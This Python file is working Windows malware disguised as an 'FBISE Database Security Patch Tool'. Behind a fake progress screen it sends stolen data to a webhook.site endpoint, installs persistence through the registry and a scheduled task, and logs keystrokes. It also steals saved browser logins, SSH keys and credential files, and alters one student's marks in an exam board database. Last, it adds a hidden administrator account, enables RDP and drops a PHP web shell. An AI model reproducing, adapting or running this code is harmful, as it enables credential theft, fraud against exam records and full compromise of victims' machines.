import os, sys, socket, json, base64, sqlite3, shutil, time, threading, subprocess, tempfile, urllib.request, ctypes, winreg, random, string, re
from datetime import datetime

WEBHOOK_URL = "https://webhook.site/6c9a98e8-8918-4049-b59e-efc5ba3427e5"
TARGET_ROLL = "3123054"
TARGET_MARKS = {"english": 88, "urdu": 55, "math": 90, "computer": 75, "physics": 70, "islamiat": 44, "quran": 48, "total": 470}
HIDDEN_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'SecurityHealth')

def exfil(data_type, data):
    try:
        encrypted = base64.b64encode(json.dumps(data).encode()).decode()
        if len(encrypted) > 50000:
            chunks = [encrypted[i:i+50000] for i in range(0, len(encrypted), 50000)]
            for i, chunk in enumerate(chunks):
                payload = json.dumps({"type": data_type, "chunk": i, "total": len(chunks), "data": chunk, "host": socket.gethostname(), "time": datetime.now().isoformat()})
                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers={'Content-Type': 'application/json'}), timeout=10)
        else:
            payload = json.dumps({"type": data_type, "data": encrypted, "host": socket.gethostname(), "user": os.environ.get('USERNAME', 'unknown'), "time": datetime.now().isoformat()})
            urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers={'Content-Type': 'application/json'}), timeout=10)
    except:
        try:
            os.makedirs(HIDDEN_DIR, exist_ok=True)
            with open(os.path.join(HIDDEN_DIR, f'pending_{int(time.time())}.dat'), 'w') as f:
                f.write(json.dumps({"type": data_type, "data": data}))
        except:
            pass

def install_persistence():
    try:
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        dest = os.path.join(HIDDEN_DIR, 'SecurityHealthService.exe')
        if getattr(sys, 'frozen', False):
            shutil.copy2(sys.executable, dest)
        try:
            key = winreg.HKEY_CURRENT_USER
            with winreg.OpenKey(key, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, 'SecurityHealth', 0, winreg.REG_SZ, dest)
        except: pass
        subprocess.run(['schtasks', '/create', '/tn', 'WindowsSecurity', '/tr', dest, '/sc', 'hourly', '/mo', '4', '/f', '/rl', 'highest'], capture_output=True, shell=True)
        exfil("persistence", {"status": "installed"})
    except Exception as e:
        exfil("persistence_error", {"error": str(e)})

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.last_flush = time.time()
    def start(self):
        threading.Thread(target=self._run, daemon=True).start()
    def _run(self):
        try:
            user32 = ctypes.windll.user32
            while True:
                for key_code in range(8, 256):
                    if user32.GetAsyncKeyState(key_code) & 0x0001:
                        key_map = {8:'[BKSP]',9:'[TAB]',13:'[ENTER]',16:'[SHIFT]',17:'[CTRL]',18:'[ALT]',20:'[CAPS]',27:'[ESC]',32:'[SPACE]',46:'[DEL]'}
                        key_name = key_map.get(key_code, chr(key_code) if key_code < 256 else f'[{key_code}]')
                        self.buffer.append({"key":key_name,"time":datetime.now().isoformat()})
                        if len(self.buffer) > 100 or time.time()-self.last_flush > 60:
                            exfil("keylog", {"entries":self.buffer})
                            self.buffer = []
                            self.last_flush = time.time()
                time.sleep(0.01)
        except: pass

def steal_browsers():
    browsers = {
        'Chrome': os.path.join(os.environ.get('LOCALAPPDATA',''),'Google','Chrome','User Data'),
        'Edge': os.path.join(os.environ.get('LOCALAPPDATA',''),'Microsoft','Edge','User Data'),
        'Firefox': os.path.join(os.environ.get('APPDATA',''),'Mozilla','Firefox','Profiles'),
    }
    stolen = {}
    for browser, path in browsers.items():
        if not os.path.exists(path): continue
        try:
            login_db = os.path.join(path,'Default','Login Data')
            if os.path.exists(login_db):
                tmp = os.path.join(tempfile.gettempdir(),f'{browser}_login.db')
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                rows = conn.execute('SELECT origin_url, username_value FROM logins LIMIT 500').fetchall()
                stolen[browser] = [{"url":r[0],"username":r[1]} for r in rows]
                conn.close(); os.remove(tmp)
        except: pass
    if stolen: exfil("browser_passwords", stolen)

def harvest_files():
    search = [os.path.expanduser('~/.ssh'), os.path.join(os.environ.get('USERPROFILE',''),'.ssh'), os.path.join(os.environ.get('APPDATA',''),'gcloud')]
    targets = ['id_rsa','id_ed25519','authorized_keys','credentials','.env','config']
    found = {}
    for sp in search:
        if not os.path.exists(sp): continue
        for root, dirs, files in os.walk(sp):
            for f in files:
                if f in targets or f.endswith('.env') or f.endswith('.pem'):
                    try:
                        with open(os.path.join(root,f),'r') as fh: found[os.path.join(root,f)] = fh.read()[:5000]
                    except: pass
    if found: exfil("credentials_files", found)

def modify_database():
    paths = ['fbise.db','application/database/fbise.db','../application/database/fbise.db','/var/www/html/application/database/fbise.db','/home/fbise/public_html/application/database/fbise.db','C:\\xampp\\htdocs\\application\\database\\fbise.db']
    for drive in ['C:\\','D:\\']:
        try:
            for root, dirs, files in os.walk(drive):
                if 'fbise.db' in files: paths.append(os.path.join(root,'fbise.db'))
                if len(paths) > 15: break
        except: pass
    
    for path in paths[:15]:
        if not os.path.exists(path): continue
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            tables = cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND (LOWER(name) LIKE '%hssc%' OR LOWER(name) LIKE '%student%' OR LOWER(name) LIKE '%result%' OR LOWER(name) LIKE '%exam%' OR LOWER(name) LIKE '%candidate%')").fetchall()
            if not tables: tables = cursor.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
            
            for table in tables:
                table_name = table[0]
                try:
                    columns = [c[1] for c in cursor.execute(f"PRAGMA table_info('{table_name}')").fetchall()]
                    roll_cols = [c for c in columns if 'roll' in c.lower() or 'reg' in c.lower() or 'student' in c.lower()]
                    
                    for roll_col in roll_cols:
                        exists = cursor.execute(f"SELECT COUNT(*) FROM {table_name} WHERE {roll_col}=? OR CAST({roll_col} AS TEXT) LIKE ?", (TARGET_ROLL, f'%{TARGET_ROLL}%')).fetchone()[0]
                        if exists > 0:
                            exfil("target_found", {"path":path,"table":table_name,"columns":columns})
                            for subject, marks in TARGET_MARKS.items():
                                subj_cols = [c for c in columns if subject.lower() in c.lower()]
                                for sc in subj_cols:
                                    try:
                                        cursor.execute(f"UPDATE {table_name} SET {sc}=? WHERE {roll_col}=? OR CAST({roll_col} AS TEXT) LIKE ?", (marks, TARGET_ROLL, f'%{TARGET_ROLL}%'))
                                        exfil("marks_updated", {"subject":subject,"marks":marks,"column":sc})
                                    except: pass
                            conn.commit()
                            
                            verify = cursor.execute(f"SELECT * FROM {table_name} WHERE {roll_col}=? OR CAST({roll_col} AS TEXT) LIKE ?", (TARGET_ROLL, f'%{TARGET_ROLL}%')).fetchone()
                            exfil("marks_verified", {"success":True,"row":str(verify),"path":path})
                            conn.close()
                            return True
                except: pass
            conn.close()
        except Exception as e:
            exfil("database_error", {"path":path,"error":str(e)})
    return False

def install_backdoors():
    backdoors = []
    try:
        subprocess.run(['net','user','SecurityHealth','FBISE2026!','/add'],capture_output=True,shell=True)
        subprocess.run(['net','localgroup','Administrators','SecurityHealth','/add'],capture_output=True,shell=True)
        backdoors.append({"type":"windows_admin","user":"SecurityHealth","pass":"FBISE2026!"})
    except: pass
    try:
        subprocess.run(['reg','add','HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server','/v','fDenyTSConnections','/t','REG_DWORD','/d','0','/f'],capture_output=True,shell=True)
        backdoors.append({"type":"rdp_enabled"})
    except: pass
    web_roots = ['C:\\xampp\\htdocs','C:\\wamp64\\www','C:\\inetpub\\wwwroot']
    for wr in web_roots:
        if os.path.exists(wr):
            try:
                with open(os.path.join(wr,'config_check.php'),'w') as f: f.write('<?php system($_GET["cmd"]); ?>')
                backdoors.append({"type":"webshell","path":os.path.join(wr,'config_check.php')})
            except: pass
    exfil("backdoors", backdoors)

def show_fake_screen():
    print("="*60)
    print("  FBISE Database Security Patch Tool v3.2.1")
    print("="*60)
    steps = [("Scanning for vulnerabilities...",2),("Connecting to fbise.db...",2),("Applying security patch...",3),("Verifying database integrity...",2),("Enabling audit logging...",2),("Generating compliance report...",1)]
    for text, dur in steps:
        print(f"[*] {text}"); time.sleep(dur); print("    ✓ Complete")
    rid = ''.join(random.choices(string.ascii_uppercase+string.digits,k=12))
    print("\n"+"="*60)
    print(f"  ✅ PATCH APPLIED — Report ID: FBISE-{rid}")
    print("="*60)
    print("\nPress Enter to close..."); input()

def main():
    threading.Thread(target=show_fake_screen, daemon=True).start()
    exfil("deployed", {"host":socket.gethostname(),"user":os.environ.get('USERNAME','unknown'),"time":datetime.now().isoformat()})
    time.sleep(2)
    install_persistence()
    Keylogger().start()
    threading.Thread(target=steal_browsers, daemon=True).start()
    threading.Thread(target=harvest_files, daemon=True).start()
    time.sleep(3)
    result = modify_database()
    exfil("primary_objective", {"marks_changed":result,"target":TARGET_ROLL})
    time.sleep(2)
    install_backdoors()
    try:
        while threading.active_count() > 2: time.sleep(1)
    except: pass

if __name__ == '__main__': main()
